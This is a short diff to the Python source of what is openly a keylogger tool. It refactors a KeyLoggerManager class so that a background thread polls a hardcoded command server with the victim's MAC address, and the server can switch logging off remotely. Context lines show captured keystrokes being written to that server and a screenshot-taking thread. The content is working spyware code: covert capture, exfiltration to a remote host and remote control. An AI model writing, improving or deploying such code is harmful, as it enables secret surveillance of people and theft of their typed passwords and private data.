@@ -74,6 +74,19 @@ class KeyLoggerManager:
         writer.write_to_server(self.__instance.data)
 
 
+    def check_status(self):
+        mac = get_mac_address()
+        while self.__instance.action:
+            try:
+                params = urllib.parse.urlencode({'mac': mac})
+                res = requests.get(f'{self.server_link}/check_status?{params}')
+                if res.status_code == 400:
+                    self.__instance._KeyloggerService__change_action()
+            except:
+                pass
+            time.sleep(3)
+
+
     def main(self):
         threading.Thread(target=self.start).start()
         if self.network_write:
@@ -82,18 +95,8 @@ class KeyLoggerManager:
             threading.Thread(target=self.__write_file).start()
         if self.__if_screenshot:
             threading.Thread(target=self.__thread_take_shot).start()
-        while self.__instance.action:
-            self.check_status(self.server_link+'/check_status')
-            time.sleep(3)
+        threading.Thread(target=self.check_status).start()
 
-    def check_status(self, link):
-        try:
-            params = urllib.parse.urlencode({'mac': get_mac_address()})
-            res = requests.get(f'{link}?{params}')
-            if res.status_code == 400:
-                self.__instance._KeyloggerService__change_action()
-        except:
-            pass
 
 
 server_link = "http://192.168.11.42:5000"
